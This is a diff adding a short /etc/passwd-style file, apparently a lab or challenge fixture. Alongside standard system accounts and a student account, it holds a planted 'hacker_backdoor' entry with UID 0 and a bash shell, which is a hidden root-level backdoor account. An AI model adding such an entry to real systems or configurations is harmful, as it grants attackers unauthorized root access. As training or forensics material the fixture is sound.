@@ -1,0 +1,8 @@
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+hacker_backdoor:x:0:45:rogue_root_access:/home/hacked:/bin/bash
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+cod3r34p3r:x:1001:1001:Student Account:/home/cod3r34p3r:/bin/bash
